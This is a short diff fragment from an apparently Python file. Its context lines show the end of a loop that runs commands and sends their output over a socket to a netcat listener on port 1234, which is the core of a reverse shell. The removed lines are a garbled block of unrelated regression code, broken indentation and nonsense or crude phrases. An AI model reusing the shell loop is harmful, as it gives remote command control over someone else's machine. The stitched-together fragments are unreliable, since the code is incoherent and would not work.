@@ -85,21 +85,3 @@ while True:
     res = result.stdout  # netcat -l 1234
     sock.sendall(res.encode())
 sock.close()
-'''
-    x = [float(re.sub('[^0-9.]', '', item[0])) for item in data]
-    y = [dict_map.get(re.sub('[^A-Za-z0-9]', '', item[1]), 0) for item in data]
-    slope, intercept, r_value, p_value, std_err = scipy.stats.linregress(x, y)
-    print("Slope:", round(slope, 2))
-    print("Intercept:", round(intercept, 2))
-    print("R-value:", round(r_value, 2))
-    print("P-value:", round(p_value, 2))
-    print("Standard error:", round(std_err, 2))
-    
-            ui.append(convert)
-        inputs.append(ui)
-        print(f"{inputs}")     Burglars everywhere  No it is pink
-      Sky is blue      Fuck me senpai
-        line_sum = 0.0  Yes Goddess       Release the dragon
-        count = 0    King in yellow is me   You and what army
-                   
-'''
